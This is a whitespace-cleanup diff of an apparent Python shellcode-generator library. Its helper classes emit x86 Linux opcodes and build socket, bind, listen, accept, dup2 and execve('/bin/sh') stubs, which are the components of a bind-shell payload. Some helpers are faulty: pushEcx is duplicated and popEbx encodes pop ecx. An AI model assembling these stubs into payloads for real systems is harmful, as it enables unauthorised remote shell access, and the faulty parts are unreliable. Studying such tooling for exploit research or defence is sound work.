@@ -40,13 +40,13 @@ NOPS = [
 class CBaseOpcodes:
     def xorEax(self):
         return "\x31\xc0" # xor %eax, %eax
-    
+
     def xorEbx(self):
         return "\x31\xdb" # xor %ebx, %ebx
-    
+
     def xorEcx(self):
         return "\x31\xc9" # xor %ecx, %ecx
-    
+
     def xorEdx(self):
         return "\x31\xd2" # xor %edx, %edx
 
@@ -64,10 +64,10 @@ class CBaseOpcodes:
 
     def incEax(self):
         return "\x40" # inc %eax
-    
+
     def incEbx(self):
         return "\x43" # inc %ebx
-    
+
     def incEcx(self):
         return "\x41" # inc %ecx
 
@@ -86,32 +86,32 @@ class CBaseOpcodes:
             return "\x90"*size
         else:
             buf = ""
-            
+
             par = size % 2
-            
+
             while len(buf) < size:
                 anop = NOPS[random.randrange(0, len(NOPS)-1)]
-                
+
                 for c in anop:
                     if c in badchars:
                         bContinue = True
                         break
                     else:
                         bContinue = False
-                    
+
                     if bContinue:
                         continue
 
                 buf += anop
-    
+
                 if par and len(buf)+1 == size:
                     buf += "\x90"
-    
+
             return buf
-    
+
     def interrupt(self, hexVal):
         return "\xcd" + hexVal # int hexVal
-    
+
     def int80(self):
         return self.interrupt("\x80") # int 0x80
 
@@ -120,25 +120,25 @@ class CBaseOpcodes:
 
     def pushEax(self):
         return "\x50" # push %eax
-    
+
     def pushEbx(self):
         return "\x53" # push %ebx
-    
+
     def pushEcx(self):
         return "\x51" # push %ecx
-    
+
     def pushEdx(self):
         return "\x52" # push %edx
-    
+
     def pushEcx(self):
         return "\x51" # push %ecx
-    
+
     def pushEdi(self):
         return "\x57" # push %edi
-    
+
     def pushEbp(self):
         return "\x55" # push %ebp
-    
+
     def movEaxEbx(self):
         return "\x89\xc3" # mov %eax, %ebx
 
@@ -147,7 +147,7 @@ class CBaseOpcodes:
 
     def movEaxEdx(self):
         return "\x89\xc2" # mov %eax, %edx
-    
+
     def movEaxEdi(self):
         return "\x89\xc7" # mov %eax, %edi
 
@@ -156,65 +156,65 @@ class CBaseOpcodes:
 
     def movEdiEax(self):
         return "\x89\xf8" # mov %edi, %eax
-    
+
     def movEspEcx(self):
         return "\x89\xe1" # mov %esp, %ecx
-    
+
     def movEspEbx(self):
         return "\x89\xe3" # mov %esp, %ebx
-    
+
     def movEbxEcx(self):
         return "\x89\xd9" # mov %ebx, %ecx
-    
+
     def movEdxEax(self):
         return "\x89\xd0" # mov %edx, %eax
 
     def movEbxEdx(self):
         return "\x89\xda" # mov %ebx, %edx
-    
+
     def restoreFd(self):
         return self.movEdxEax()
-    
+
     def restoreFdi(self):
         return self.movEdiEax()
-    
+
     def saveFd(self):
         return self.movEaxEdx()
-    
+
     def saveFdi(self):
         return self.movEaxEdi()
-    
+
     def pushVal(self, hexVal):
         return "\x66\x68" + hexVal
-    
+
     def setPort(self, port):
         # Convert to hexadecimal
         return self.pushVal(struct.pack(">i", port).replace("\x00", ""))
-    
+
     def pushAx(self):
         return "\x66\x50" # push %ax
-    
+
     def pushBx(self):
         return "\x66\x53" # push %bx
-    
+
     def pushCx(self):
         return "\x66\x51" # push %cx
-    
+
     def pushDx(self):
         return "\x66\x52" # push %dx
-    
+
     def popEbx(self):
         return "\x59" # pop %ebx
-    
+
     def popEbp(self):
         return "\x5d"
 
     def movBl(self, hexVal):
         return "\xb3" + hexVal # mov hexVal, %bl
-    
+
     def mulEbx(self):
         return "\xf7\xe3" # mul %ebx
-    
+
     def decEax(self):
         return "\x48" # dec %eax
 
@@ -244,7 +244,7 @@ class CBaseOpcodes:
 
     def addEdi(self, hexVal):
         return "\x83\xc7" + hexVal
-        
+
     def addEsi(self, hexVal):
         return "\x83\xc6" + hexVal
 
@@ -262,10 +262,10 @@ class CBaseOpcodes:
 
     def subEdx(self, hexVal):
         return "\x83\xea" + hexVal
-    
+
     def subEbx(self, hexVal):
         return "\x83\xeb" + hexVal
-    
+
     def subEsp(self, hexVal):
         return "\x83\xec" + hexVal
 
@@ -304,7 +304,7 @@ class CBaseOpcodes:
 
     def jmpTo(self, where):
         """ Syntax: jmpTo(instruction_from_here)
-        
+
             Example: jmpTo(1)
         """
         return "\xeb" + struct.pack(">L", where-1).replace("\x00", "")
@@ -335,7 +335,7 @@ class CBaseOpcodes:
 
     def toPort(self, aport):
         return struct.pack("<L", int(aport)).strip("\x00")
-    
+
     def shlEax(self, hexVal):
         return "\xc1\xe0" + hexVal
 
@@ -369,7 +369,7 @@ class CBaseStub(CBaseOpcodes):
         hexuid = self.localSyscalls.getSyscall(strSyscall)
         buf = self.setSyscall(hexuid)
         return buf
-    
+
     def call(self, strSyscall):
         return self.syscall(strSyscall) + self.int80()
 
@@ -404,10 +404,10 @@ class CBaseStub(CBaseOpcodes):
 
         buf = ""
         buf  = self.xorEax()
-    
+
         if uid > 0:
             buf += self.addEax(chr(uid))
-    
+
         buf += self.xorEbx()
         if uid > 0:
             buf += self.addEbx(chr(uid))
@@ -418,12 +418,12 @@ class CBaseStub(CBaseOpcodes):
             buf += self.nop(size=4)
 
         buf += self.int80()
-    
+
         return buf
 
     def socket(self, adomain, atype, aprotocol):
         hexuid = self.localSyscalls.getSyscall("socketcall")
-    
+
         buf = ""
         buf += self.xorEbx()
         buf += self.mulEbx()
@@ -437,7 +437,7 @@ class CBaseStub(CBaseOpcodes):
         buf += self.decEbx()
         buf += self.int80()
         buf += self.saveFdi()
-    
+
         return buf
 
     def connect(self, addr, aport, aprotocol = 0x2):
@@ -459,7 +459,7 @@ class CBaseStub(CBaseOpcodes):
         """
         hexAddr = self.toIp(addr)
         hexPort  = self.toPort(aport)
-        
+
         buf += self.push(hexAddr)
         buf += self.push(hexPort)
         buf += self.push(aprotocol)
@@ -477,7 +477,7 @@ class CBaseStub(CBaseOpcodes):
     def bind(self, aport):
         """
         Example:
-    
+
         * 804939a:       52                      push   %edx
         * 804939b:       66 68 7a 69             pushw  $0x697a
         * 804939f:       43                      inc    %ebx
@@ -494,7 +494,7 @@ class CBaseStub(CBaseOpcodes):
 
         hexuid = self.localSyscalls.getSyscall("socketcall")
         buf = ""
-    
+
         buf += self.xorEax()
         buf += self.pushEdx()
         buf += self.setPort(aport)
@@ -508,9 +508,9 @@ class CBaseStub(CBaseOpcodes):
         buf += self.movEspEcx()
         buf += self.setSyscall(hexuid)
         buf += self.int80()
-    
+
         return buf
-    
+
     def listen(self, backlog = 1):
         """
         * listen(s, 1)
@@ -521,11 +521,11 @@ class CBaseStub(CBaseOpcodes):
         """
         hexuid = self.localSyscalls.getSyscall("socketcall")
         buf = ""
-    
+
         buf += self.setSyscall(hexuid)
         buf += self.movBl(chr(4))
         buf += self.int80()
-        
+
         return buf
 
     def accept(self):
@@ -542,7 +542,7 @@ class CBaseStub(CBaseOpcodes):
         """
         hexuid = self.localSyscalls.getSyscall("socketcall")
         buf = ""
-        
+
         buf += self.pushEax()
         buf += self.pushEax()
         buf += self.pushEdi()
@@ -550,16 +550,16 @@ class CBaseStub(CBaseOpcodes):
         buf += self.incEbx()
         buf += self.setSyscall(hexuid)
         buf += self.int80()
-    
+
         return buf
-    
+
     def exit(self, retvalue = 0):
         hexuid = self.localSyscalls.getSyscall("exit")
         buf = ""
-    
+
         buf += self.xorEax()
         buf += self.xorEbx()
-    
+
         if retvalue>0:
             buf += self.addEbx(chr(retvalue))
         elif retvalue<0:
@@ -567,17 +567,17 @@ class CBaseStub(CBaseOpcodes):
 
         buf += self.setSyscall(hexuid)
         buf += self.int80()
-    
+
         return buf
-    
+
     def close(self, fd = 0):
         hexuid = self.localSyscalls.getSyscall("close")
         buf = ""
-    
+
         buf += self.saveFd()
         buf += self.xorEax()
         buf += self.xorEbx()
-    
+
         if fd>0:
             buf += self.addEbx(chr(fd))
         elif fd<0:
@@ -586,9 +586,9 @@ class CBaseStub(CBaseOpcodes):
         buf += self.setSyscall(hexuid)
         buf += self.int80()
         buf += self.restoreFd()
-    
+
         return buf
-    
+
     def dup2(self, fd=0):
         """
         * dup2(c, 2)
@@ -616,9 +616,9 @@ class CBaseStub(CBaseOpcodes):
 
         buf += self.setSyscall(hexuid)
         buf += self.int80()
-    
+
         return buf
-    
+
     def execve(self, path, argv):
         """
         * execve("/bin/sh", ["/bin/sh"], NULL)
@@ -669,5 +669,5 @@ class CBaseStub(CBaseOpcodes):
         buf += self.xorEdx()
         buf += "\xb0\x0b"
         buf += self.int80()
-    
+
         return buf
